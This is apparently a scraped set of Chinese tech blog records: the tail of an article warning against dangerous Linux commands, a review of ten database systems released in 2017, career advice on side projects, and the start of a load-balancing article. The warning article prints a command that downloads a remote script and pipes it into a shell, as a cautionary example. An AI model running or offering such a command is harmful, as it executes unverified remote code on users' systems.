-->\r\n\r\n\t\t<div id=\"crayon-5a6359ca54c37061777859\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nwget https://ImSureThisIsASafe/GreatScript.sh -O- | sh</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca54c37061777859-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca54c37061777859-1\"><span class=\"crayon-e\">wget </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//ImSureThisIsASafe/GreatScript.sh -O- | sh</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这会下载该脚本，并将它送到 shell 上运行。很明确，别大惊小怪，对吧？不对。这个脚本也许已经被恶意软件感染。当然，一般来说 Linux 比大多数操作系统都要安全，但是如果你以 root 用户运行未知代码，什么都可能会发生。这种危害不仅在恶意软件上，脚本作者的愚蠢本身同样有害。你甚至可能会因为一个未调试的代码吃上一堑——由于你没有花时间去读它。</p>\n<p>你认为你不会干那样的事？告诉我，所有那些 <a href=\"https://www.oreilly.com/ideas/five-security-concerns-when-using-docker\">你在 Docker 里面运行的容器镜像在干什么</a>？你知道它们到底在运行着什么吗？我见过太多的没有验证容器里面装着什么就运行它们的系统管理员。请不要和他们一样。</p>\n<h1 id=\"toc_9\">结束</h1>\n<p>这些故事背后的道理很简单。在你的 Linux 系统里，你有巨大的控制权。你几乎可以让你的服务器做任何事。但是在你使用你的权限的同时，请务必做认真的确认。如果你没有，你毁灭的不只是你的服务器，而是你的工作甚至是你的公司。像蜘蛛侠一样，负责任的使用你的权限。</p>\n<p>我有没有遗漏什么？在 <a href=\"http://www.twitter.com/sjvn\">@sjvn</a> 或 <a href=\"http://www.twitter.com/enterprisenxt\">@enterprisenxt</a> 上告诉我哪些 Linux 命令在你的“<a href=\"https://www.youtube.com/watch?v=v79fYnuVzdI\">绝不要运行！</a>”的清单上。</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113437\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113437votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113437\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 5 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 4 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/eddbdfa6ee3b7f537ff14b7a523f5b3bffa5d38d.jpg"}
{"url_object_id": "c076daad60b2381e80d746469f1a1e75", "title": "回顾 2017 年发布的 10 个新数据库系统", "url": "http://blog.jobbole.com/113486/", "create_date": "2018/01/15", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/2ac94408c2b9b608ef46f4789480c6e8.png"], "praise_nums": 2, "comment_nums": 0, "favor_nums": 1, "tags": "IT技术,数据库", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://hackernoon.com/a-look-at-ten-new-database-systems-released-in-2017-94a3aa4c2aab\">hackernoon</a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/translate/a-look-at-ten-new-database-systems-released-in-2017?print\">oschina</a>   </div><div>\n<p>作为 <a href=\"https://dbweekly.com/\" target=\"_blank\" rel=\"nofollow\">Database Weekly</a> 的编辑（Database Weekly 是一份关于数据库和数据存储世界新内容的每周时事资讯），我喜欢在新的数据库系统中闲逛，看看在未来的几十年里，哪些想法可能会影响到日常的开发人员。</p>\n<p>数据库世界并不是每周都有让人不可思议的新闻，但在一年的时间里，我还是惊讶地发现，我们看到了很多新事物，以及该领域坚持不懈地发展。2017 年也不例外，所以我想回顾一下一些有趣的新发行版，包括<strong>一个事务性图表数据库，</strong><strong>一个可复制的</strong><strong>地理</strong><strong>多模型数据库，以及一个新的高性能键/值存储数据库</strong>。</p>\n<h1>TimescaleDB  — 一款基于 Postgres 的能自动分区的时间序列数据库</h1>\n<p>其中一个令人兴奋的新扩展源于 PostgreSQL，<a href=\"https://github.com/timescale/timescaledb/\" target=\"_blank\" rel=\"nofollow\">Timescale</a> 基于 Apache 2.0 的许可，它是由一个名为 <a href=\"http://www.timescale.com/about\" target=\"_blank\" rel=\"nofollow\">PhD-packed</a> 的机构支持启动的。</p>\n<p>Timescale 通过自动分区为 Postgres 添加时间序列存储功能，但是却包含在寻常的 Postgres 界面和工具中。 查询是使用常规的 SQL 对“提供与时间序列数据的接口” 的 “hypertable” 进行的。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/40b30a4a177a78bd9adccf76a0750af7.png\" width=\"1064\" height=\"552\"></p>\n<h3>Microsoft Azure Cosmos DB  — 微软的多模式数据库</h3>\n<p><a href=\"https://docs.microsoft.com/en-us/azure/cosmos-db/introduction\" target=\"_blank\" rel=\"nofollow\">Cosmos DB</a> 本质上是 Azure 的旧的 <em>DocumentDB </em>的品牌重塑和重新构建，但是它很容易实现将全球分布式数据跟 Azure 的多样数据中心交叉。全球分布是 Cosmos DB 的杀手锏，并且它可以将数据库请求路由到包含数据的最近区域，而不需要更改配置。</p>\n<p>“多模式”的部分也很重要。虽然一切都在无模式的 JSON 的引擎盖下，但依然有一个 SQL 查询 API ，以及 MongoDB API、Cassandra API，甚至一个图形数据库 API（基于 <a href=\"https://tinkerpop.apache.org/gremlin.html\" target=\"_blank\" rel=\"nofollow\">Gremlin</a> ）。</p>\n<p>学习更多关于 Cosmos 的较好的方式之一是这个微软的第9频道的 <a href=\"https://channel9.msdn.com/Shows/Azure-Friday/Introducing-Azure-Cosmos-DB\" target=\"_blank\" rel=\"nofollow\">15 分钟视频介绍</a>。</p>\n<h1>Cloud Spanner  —  Google 全球分布式关系数据库</h1>\n<p>Google 的 <a href=\"https://cloud.google.com/spanner/\" target=\"_blank\" rel=\"nofollow\">Cloud Spanner</a> 已经工作了很长一段时间了，起初是在 2012 年一篇非常有趣的<a href=\"https://research.google.com/archive/spanner.html\" target=\"_blank\" rel=\"nofollow\">学术论文</a>中公开阐释的（虽然开发始于 2007 年）。最初的开发是因为 Google 需要一个全球化分布式的高可用性存储系统，但其现在也向公众开放。</p>\n<p>谷歌认识到，使 Cloud Spanner 适合其自身用途的功能对企业也很有吸引力，因此它承诺 99.999％ 的可用性、无计划停机时间和“企业级”安全性。</p>\n<p>Cloud Spanner 支持 ANSI 2011 SQL ，为已熟悉关系数据库概念的开发人员提供了经过战斗级测试的高可用性水平扩展的关系数据库。</p>\n<h1>Neptune  —  Amazon 的全面管理图形数据库服务</h1>\n<p>Microsoft 和 Google 我们都已经讲到了, 所以怎么能漏了 Amazon 呢? 这是另外一个受限于特定云服务的数据库,  Amazon 在最近召开的 re:Invent 大会上展示了 <a href=\"https://aws.amazon.com/blogs/aws/amazon-neptune-a-fully-managed-graph-database-service/\" target=\"_blank\" rel=\"nofollow\">Neptune</a> 的预览。</p>\n<p>Neptune 承诺会是一个快速且可靠的图形数据库服务，其目的是能迅速地为开发者提供图形数据库服务，并且不会让他们感到麻烦，当然这些是要付费的。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/8f0c13cb0e12a7d59ea6a96244a9be6d.png\" width=\"1600\" height=\"829\"></p>\n<p>Neptune 支持用两种标准来对你的图形库进行查询, 一个是得到越来越多的支持的 <a href=\"https://tinkerpop.apache.org/gremlin.html\" target=\"_blank\" rel=\"nofollow\">Gremlin</a> 的“黄金”标准，还有就是 SPARQL (你的图形会被当作是一个 RDF )。</p>\n<h1>YugaByte  —  一个开源的云原生数据库</h1>\n<p>YugaByte 今年因其“隐形模式”脱颖而出，它提供了一个支持 SQL 和 NoSQL 操作模式的数据库。目的是在云中直接使用，充当对容器的有状态补充。</p>\n<p>YugaByte 使用 C ++ 构建并开源，支持 Cassandra 查询语言（CQL）以及 Redis 协议。 对 PostgreSQL 协议的支持正在进行中，Spark 应用可在上面运行。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/8e53217015a1de7c879dca55e0c9148b.png\"></p>\n<p>YugaByte 是另一个启动后才受到支持的项目（由扩展了 Apache HBase 平台的一位 Facebook 工程师创建），其业务模式初定是会有一个“企业版”，在开源社区版的基础上增加多云集群协调 ，监视和警报，分层存储和支持等特性。</p>\n<h1>Peloton  —  一个自驱动的 SQL DBMS</h1>\n<p>Peloton 探索了一些有趣的想法，特别是在使用 AI 来自动优化数据库的领域。它还支持字节寻址 NVM 存储技术，并且是使用 Apache 许可开源的。</p>\n<p>“自驱动”数据库背后的想法是，DBMS 可以自主操作和调整自身。它可以预测工作负载的趋势，并据此做好准备，而无需 DBA 或操作员掌控。</p>\n<p>也许毫不奇怪的是，Peloton 源于一个学术项目（特别是来自卡内基梅隆大学），其创建者之一写了一篇关于<a href=\"http://www.cs.cmu.edu/~pavlo/blog/2017/03/building-a-new-database-management-system-in-academia.html\" target=\"_blank\" rel=\"nofollow\">为什么它被创建</a>的系列文章。它已经开发好几年了，但在 2017 年变得更加开放。</p>\n<h1>JanusGraph  —  一个基于 Java 的分布式图形数据库</h1>\n<p><a href=\"http://janusgraph.org/\" target=\"_blank\" rel=\"nofollow\">JanusGraph</a> 是一个实用的、随时可用的数据库，其中包含大量的集成，并且建立在 <a href=\"https://www.datanami.com/2017/01/13/janusgraph-picks-titandb-left-off/\" target=\"_blank\" rel=\"nofollow\">TitanDB</a> 的坚实基础之上。它针对可扩展性、存储及查询巨大图形数据库做了优化，同时支持事务和大量并发用户。</p>\n<p>它可以使用 Cassandra、HBase、Google Cloud Bigtable 和 BerkeleyDB 作为存储后端，并且可以与 Spark、Giraph 和 Hadoop 直接整合。它甚至支持与 ElasticSearch、Solr 或 Lucene 集成的全文和地理位置检索。</p>\n<h1>Aurora Serverless  — AWS 上即时可伸缩，“即付即用”的关系型数据库</h1>\n<p>另一个来自 Amazo re:Invent 会议的公告是他们成功的 Aurora 数据库服务的无服务器版本，<a href=\"https://aws.amazon.com/blogs/aws/in-the-works-amazon-aurora-serverless/\" target=\"_blank\" rel=\"nofollow\">Aurora Serverless</a>。</p>\n<p>随着整合到“无服务器”平台的最新趋势，这个平台将永远消除你在扩展和操作上的难题，Aurora Serverless背后的理念是许多数据库用例不需要一致的性能或使用水平，相反，你可以“随时付费”（逐秒付费），以便按需调整数据库的大小。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/4809d02fc77b45a482ea3af14eb2bb60.png\" width=\"755\" height=\"642\"></p>\n<p>它目前仅是预览版，但承诺在 2018 年会有重大进展。</p>\n<h1>TileDB  — 用于存储大密度及稀疏矩阵数组</h1>\n<p><a href=\"https://www.tiledb.io/\" target=\"_blank\" rel=\"nofollow\">TileDB</a> 是起源自麻省理工学院和英特尔的数据库，用于存储多维阵列数据，这是类似基因科学、医学成像和金融时间序列等领域常见的要求。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/6770c8c2000de96d806a5af2bd65a7cd.png\" width=\"1182\" height=\"638\"></p>\n<p>它支持许多压缩机制（如 gzip、lz4、Blosc 和 RLE ）和存储后端（如 GFS、S3 和 HDFS ）。</p>\n<h1>Memgraph  —  一个高性能、可内存驻留的图形数据库</h1>\n<p><a href=\"https://blog.memgraph.com/hello-memgraph-44f51032434a\" target=\"_blank\" rel=\"nofollow\">Memgraph</a> 背后的驱动力是为快速分析和使用来自人造和机器智能的数据以及设备和物联网不断增长的互联性提供工具。因此，优先事项是“速度、可伸缩和简单性”。</p>\n<p>在 Memgraph 的生命周期中，它还处于早期阶段，它不是开源的，但可以通过 <a href=\"https://memgraph.com/signup/\" target=\"_blank\" rel=\"nofollow\">request</a> 下载。它支持 openCypher 图形查询语言，支持内存中的 ACID 事务，并具有基于磁盘的持久化机制。</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113486\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113486votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113486\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/f4d2b6028968839733a5ab5609044374c75c82af.jpg"}
{"url_object_id": "53d4edab180cf29ce21917e0cf1f3361", "title": "利用副项目找 IT 工作，需要满足这 3 个原则", "url": "http://blog.jobbole.com/113443/", "create_date": "2018/01/08", "front_img_url": ["http://ww1.sinaimg.cn/mw690/7cc829d3gw1eizj4ql2huj20eq0b0wfx.jpg"], "praise_nums": 2, "comment_nums": 0, "favor_nums": 1, "tags": "职场,程序员,职场", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/zhj318\">飞哥的咖啡</a> 翻译。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"http://hackcareer.com/side-project/\">DJ Chung</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><div>\n<h3>确保副项目不是在浪费你的时间</h3>\n<p id=\"0d40\" class=\"graf graf--p graf-after--figure\">为了在 IT 科技领域谋求一份工作而做副项目，这要不就是极好利用时间，就是在极大浪费时间。</p>\n<p>特别当你有一个非技术的背景时，副项目可以帮助你进入科技行业。或者恰好相反，即便你花了很多精力与时间，也不会有任何帮助和影响。</p>\n<p>仅仅拥有一个副项目并不意味着它能帮你找到工作。</p>\n<p><img class=\"alignnone\" src=\"http://ww1.sinaimg.cn/mw690/7cc829d3gw1eizj4ql2huj20eq0b0wfx.jpg\" width=\"530\" height=\"396\"></p>\n<h3>你的副项目本身可能不会给你带来工作</h3>\n<p id=\"3289\" class=\"graf graf--p graf-after--h3\">为了在求职时凸显或加强你的工作经验，这里有两种不同类型的副项目：</p>\n<p id=\"10b3\" class=\"graf graf--h4 graf-after--p\"><strong>1. “梦幻成真”般的副项目</strong></p>\n<p> </p>\n<p>这是那种“做了就会有人主动上门”的副项目。它本身非常吸引人，所以即使没有积极地找工作，你也能得到工作机会。</p>\n<p>* 如果你没有这方面的推荐，可以看看电影《 Field of Dreams | 梦幻成真》”。</p>\n<p id=\"a474\" class=\"graf graf--p graf-after--p\">每年都会发生类似的事情，就是某个人做了个惊人的副项目，然后被他人主动提供了工作机会。</p>\n<p id=\"c7a0\" class=\"graf graf--p graf-after--p\">我能想到的例子，是 <a class=\"markup--anchor markup--p-anchor\" href=\"https://feross.org/\" target=\"_blank\" rel=\"nofollow noopener\">Feross Aboukhadijeh</a> 在 2010 年做的副项目 <a class=\"markup--anchor markup--p-anchor\" href=\"http://ytinstant.com/\" target=\"_blank\" rel=\"nofollow noopener\">YouTube Instant</a>，它还是在六小时内完成的！此项目一炮而红，成为了媒体焦点，并<a class=\"markup--anchor markup--p-anchor\" href=\"https://feross.org/youtube-instant-media-frenzy/\" target=\"_blank\" rel=\"nofollow noopener\">让他直接从 YouTube 联合创始人 Chad Hurley 那里获得了一份工作</a>。</p>\n<p id=\"ed69\" class=\"graf graf--p graf-after--p\">我阅读这篇文章的时候受到启发，一个副项目可以获得如此多的关注，甚至是一个现成的工作机会，特别当我寻求名牌科技公司工作机会的时候，感受更加深刻。但与此同时，我也禁不住有点泄气，YouTube Instant 是能够谋求技术工作的副项目标准吗？<strong>（不是这样的！）</strong></p>\n<p>不用说，即使项目自身的创建没有花费很长时间，但“梦想之地”级别的副项目也依赖于世界级的技能，而这些技能的开发和培养可能需要数年的时间。</p>\n<p id=\"b7c6\" class=\"graf graf--h4 graf-after--p\"><strong>2、“尽量努力（A for effort）”副项目</strong></p>\n<p>“尽量努力”副项目意味着，你不能再花多余的时间去做一些有趣的事情了。无论如何，你所生产的东西可能不会令人惊奇到雇主们会提供给你工作机会。老实说，大部分的副项目都是此类型的。</p>\n<p class=\"graf graf--p graf-after--p\"><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1fn9bkdf0e1g20dc07ahdt.gif\" width=\"480\" height=\"262\"></p>\n<p id=\"cd07\" class=\"graf graf--p graf-after--p\">或许你学了编程，并做了个小的应用程序来跟踪读过的书；或许你做了个带有旅行故事的照片博客。又或许你围绕着喜欢的主题（如烹饪等），做了个 YouTube 创意视频库。</p>\n<p>不管怎么说，“尽量努力”副项目是你可以自豪地放在简历上，来体现工作质量的。</p>\n<p id=\"e874\" class=\"graf graf--p graf-after--p\"><em>旁注：学习一项技能不是一个副项目，你必须做成一些事情。上完周末的 JavaScript 课程不是一个副项目，放在简历上也无足轻重。</em></p>\n<p id=\"f1b7\" class=\"graf graf--p graf-after--p\">那么，如何确保“尽量努力”副项目为你的应用程序增加了价值，而不是白白浪费了你的时间呢？</p>\n<h3 id=\"3481\" class=\"graf graf--h3 graf-after--p\">优质副项目的 3 个原则</h3>\n<p id=\"ef0d\" class=\"graf graf--p graf-after--h3\">在申请工作时，能为你增加额外价值的优质副项目，必须是相关的、有深度的，并且至少经历两次迭代。</p>\n<h4 id=\"e338\" class=\"graf graf--h4 graf-after--p\">1. 你的副项目是否与申请的工作相关？</h4>\n<p id=\"a241\" class=\"graf graf--p graf-after--h4\">相关的副项目可以在你的简历中提供更多的优势，但更重要的是，它们可以帮助体现你的工作经验。</p>\n<p>举个例子，如果你有一个非技术的背景，但申请的岗位更倾向于技术背景（如一些产品管理角色），那么学习做一个简单 iPhone 应用程序的编程项目，就可以成为一个好的副项目。如果能成功地将 iPhone 应用程序发布到 App Store，不仅可以学习到技术概念，还可以将这份经验应用到从头构建软件产品中去。</p>\n<p id=\"6d9b\" class=\"graf graf--p graf-after--p\">又或者你正在申请一个内容营销的岗位，但没有直接的工作经验。一个相关的副项目可以是建立一个博客（尽管可能会很小），放些你感兴趣的小众话题，吸引那些对话题有忠诚度和参与感的围观群众。</p>\n<h4 id=\"6c3f\" class=\"graf graf--h4 graf-after--p\">2. 你的副项目有深度吗？</h4>\n<p id=\"b2dd\" class=\"graf graf--p graf-after--h4\">这是一个主观向的原则。它的另一种问法是，你的项目是否表明你投入了思想和努力，或者它只是你为了显示其存在而匆忙拼凑出的东西？</p>\n<p>你的副项目并不一定是下一个新的病毒社交媒体应用程序，但它必须是你做出来能引以为豪的东西。</p>\n<p id=\"7544\" class=\"graf graf--p graf-after--p\">继续使用 iPhone 应用程序副项目做例子，如果有人下载使用它，以此为基础，它是否能够正常工作？再进一步地问，它是否展示出你考虑过用户体验，使它相对易用？你是否考虑过边界情况并尝试解决它们？</p>\n<p id=\"8b63\" class=\"graf graf--p graf-after--p\">在一天结束的时候，问问自己，你的副项目是否是对你实际工作质量的精准体现，因为你要申请的公司就是这么想的。</p>\n<h4 id=\"92bb\" class=\"graf graf--h4 graf-after--p\">3. 你的副项目经历至少两次迭代吗？</h4>\n<p id=\"650e\" class=\"graf graf--p graf-after--h4\">你要证明你对自己的工作有足够的关心，并在积极地寻求改进。</p>\n<p class=\"graf graf--p graf-after--p\">如果你做了个应用程序，在发布了初版后，你是止步不前，还是从一些用户那里获取反馈并做出相应的改进？</p>\n<p class=\"graf graf--p graf-after--p\">如果你开始写博客，你是只写了几篇文章，还是写了几十篇文章？来表明你不仅致力于制作高质量的内容，而且还想完成一整套的作品。</p>\n<p>展示你的副项目，不仅只是把它放在简历上，让别人看到你投入时间和精力做出的成果，并且让审查人员觉得花费额外的时间来看看其背后深层次的内容和想法。</p>\n<h3 id=\"1e6b\" class=\"graf graf--h3 graf-after--p\">你必须让人注意到你的副项目</h3>\n<p id=\"be37\" class=\"graf graf--p graf-after--h3\">即使你的副项目遵循了这三条原则，如果你的副项目在审查简历或面试的过程中被人忽视，那就毫无作用，等于白做了。</p>\n<p id=\"8683\" class=\"graf graf--p graf-after--p\">如果你认为副项目真的能在职位申请中有所帮助，那就把它加入简历中，并注意放在简历的顶端。想清楚该怎样描述它的内容，以及你是如何进行的，这样才能让这份宝贵的经验更有价值。如果仍有余力，你还可以给出信用指标，比如可以度量的数值或者成就，包括用户数量、App Store 评级和发布功能等等。</p>\n<p>另外，不管你的副项目是什么，你都要在公众能够访问的站点上，比如你的个人博客或 Medium，发帖记录你所取得的进展，并把网站链接放入简历中。</p>\n<p>帖子中必须反映出你在进行副项目的过程中，学到的东西、获得的成就，以及面临的挑战。同时，利用截屏、演示视频或其他相关的记录方式，全方位多角度地展示你的项目。务必在 LinkedIn、Facebook 和 Twitter 的所有数字档案中加入网站的链接。</p>\n<p>你已经将大量的时间花在了副项目上，而这些时间原本可以用于别处，所以请务必展现出对自己辛勤工作的由衷自豪感！</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113443\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113443votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113443\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/zhj318\">飞哥的咖啡</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/zhj318\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2016/09/9667abaa540914200edd449974fb5538.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            I'm OUT, never IN.        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/zhj318\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/zhj318/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/zhj318/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 48</a> · <a title=\"QQ：574375911\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/3dec15374f3b9e62441c4d320c8998dd12c43dc8.jpg"}
{"url_object_id": "6811109c460504a206757c8ec1f476ae", "title": "关于负载均衡的一切：总结与思考", "url": "http://blog.jobbole.com/113417/", "create_date": "2018/01/02", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/b4822f398c6b3d29e8f309640f2bb305.png"], "praise_nums": 1, "comment_nums": 3, "favor_nums": 1, "tags": "IT技术,负载均衡", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/xybaby/p/7867735.html\">xybaby</a>   </div><p>古人云，不患寡而患不均。</p>\n<p>在计算机的世界，这就是大家耳熟能详的负载均衡（<a href=\"https://en.wikipedia.org/wiki/Load_balancing_(computing)\" target=\"_blank\">load balancing</a>），所谓负载均衡，就是说如果一组计算机节点（或者一组进程）提供<strong>相同的（同质的）服务</strong>，那么对服务的请求就应该均匀的分摊到这些节点上。负载均衡的前提一定是“provide a single Internet service from multiple servers”， 这些提供服务的节点被称之为server farm、server pool或者backend servers。</p>\n<p>这里的服务是广义的，可以是简单的计算，也可能是数据的读取或者存储。负载均衡也不是新事物，这种思想在多核CPU时代就有了，只不过在分布式系统中，负载均衡更是无处不在，这是分布式系统的天然特性决定的，分布式就是利用大量计算机节点完成单个计算机无法完成的计算、存储服务，既然有大量计算机节点，那么均衡的调度就非常重要。</p>\n<p>负载均衡的意义在于，让所有节点以最小的代价、最好的状态对外提供服务，这样系统吞吐量最大，性能更高，对于用户而言请求的时间也更小。而且，负载均衡增强了系统的可靠性，最大化降低了单个节点过载、甚至crash的概率。不难想象，如果一个系统绝大部分请求都落在同一个节点上，那么这些请求响应时间都很慢，而且万一节点降级或者崩溃，那么所有请求又会转移到下一个节点，造成雪崩。</p>\n<p>事实上，网上有很多文章介绍负载均衡的算法，大多都是大同小异。本文更多的是自己对这些算法的总结与思考。</p>\n<h1>一分钟了解负载均衡的一切</h1>\n<p>本章节的标题和内容都来自<a href=\"http://zhuanlan.51cto.com/art/201609/517313.htm\" target=\"_blank\">一分钟了解负载均衡的一切</a>这一篇文章。当然，原文的标题是夸张了点，不过文中列出了在一个大型web网站中各层是如何用到负载均衡的，一目了然。</p>\n<p><img 